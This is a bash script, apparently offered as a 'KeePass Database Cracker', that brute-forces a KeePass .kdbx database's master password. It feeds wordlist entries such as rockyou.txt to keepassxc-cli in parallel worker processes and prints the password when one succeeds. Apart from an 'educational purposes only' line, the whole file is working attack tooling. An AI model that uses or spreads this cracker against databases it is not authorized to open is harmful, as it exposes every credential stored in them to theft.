#!/usr/bin/env bash
# KeePass Database Cracker - Multithreaded Version v1.0
# Educational purposes only - Test your own databases

version="1.0"

echo "=========================================="
echo "  KeePass Database Cracker v$version"
echo "=========================================="

# Check dependencies
dep="keepassxc-cli"
command -v "$dep" &>/dev/null || { 
    echo "[!] Error: $dep not installed. Please install it first."
    echo "    sudo apt install keepassxc"
    exit 1
}

# Validate arguments
if [ $# -lt 2 ] || [ $# -gt 3 ]; then
    echo ""
    echo "Usage: $0 <kdbx-file> <wordlist> [max_procs]"
    echo ""
    echo "Arguments:"
    echo "  kdbx-file   Path to KeePass database file (.kdbx)"
    echo "  wordlist    Path to wordlist file"
    echo "  max_procs   Number of parallel processes (default: 4)"
    echo ""
    echo "Example:"
    echo "  $0 database.kdbx /usr/share/wordlists/rockyou.txt 8"
    exit 2
fi

kdbx_file="$1"
wordlist="$2"
max_procs=${3:-4}

# Validate files exist
if [ ! -f "$kdbx_file" ]; then
    echo "[!] Database file not found: $kdbx_file"
    exit 2
fi

if [ ! -f "$wordlist" ]; then
    echo "[!] Wordlist not found: $wordlist"
    exit 2
fi

echo ""
echo "[*] Target database: $kdbx_file"
echo "[*] Wordlist: $wordlist"
echo "[*] Parallel processes: $max_procs"
echo "[*] Starting password cracking..."
echo ""

# Initialize semaphore using FIFO for process pooling
tmpfifo=$(mktemp -u)
mkfifo "$tmpfifo"
exec 3<>"$tmpfifo"
rm "$tmpfifo"

# Fill semaphore with tokens
for ((i=0; i<max_procs; i++)); do
    echo >&3
done

found=0
attempts=0

# Worker function to test a single password
try_pass() {
    local pass="$1"
    
    if echo "$pass" | keepassxc-cli open "$kdbx_file" &>/dev/null; then
        echo ""
        echo "============================================"
        echo "[+] PASSWORD FOUND: $pass"
        echo "============================================"
        echo ""
        found=1
        kill 0  # Terminate all workers
    fi
}

# Process wordlist and dispatch jobs
while IFS= read -r pass && [ "$found" -eq 0 ]; do
    ((attempts++))
    
    # Progress indicator every 1000 attempts
    if [ $((attempts % 1000)) -eq 0 ]; then
        echo -ne "\r[*] Tested: $attempts passwords..."
    fi
    
    # Acquire token (blocks if pool is full)
    read -u 3
    
    {
        try_pass "$pass"
        echo >&3  # Release token
    } &
done < "$wordlist"

# Wait for all background jobs to complete
wait

echo -ne "\r[*] Total passwords tested: $attempts          \n"

if [ "$found" -eq 0 ]; then
    echo ""
    echo "[!] Password not found in wordlist"
    echo "[*] Consider using a different wordlist or password generation rules"
    exit 3
fi